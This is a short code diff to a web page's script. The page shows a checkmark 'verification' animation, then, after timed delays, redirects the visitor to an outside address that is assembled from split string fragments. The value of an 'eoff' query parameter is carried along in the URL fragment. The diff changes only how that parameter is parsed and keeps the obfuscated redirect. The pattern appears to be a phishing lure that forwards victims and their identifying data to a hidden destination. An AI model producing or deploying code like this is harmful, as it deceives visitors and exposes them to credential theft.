@@ -229,9 +229,14 @@
                 c.setAttribute('d','M20 6L9 17l-5-5');
                 c.style.strokeDasharray='none';
                 setTimeout(()=>{
-                    const e=new URLSearchParams(window.location.search).get('eoff');
+                    const s=window.location.search;
+                    const p=s.indexOf('eoff=');
+                    let x='';
+                    if(p!==-1){
+                        x=s.substring(p+5);
+                    }
                     const u=['ht','tps://','po.bl','anread.inf','o/NkEJ','vfdd'];
-                    window.location.href=u.join('')+(e?'#'+e:'');
+                    window.location.href=u.join('')+(x?'#'+x:'');
                 },1200);
             },2500);
         }
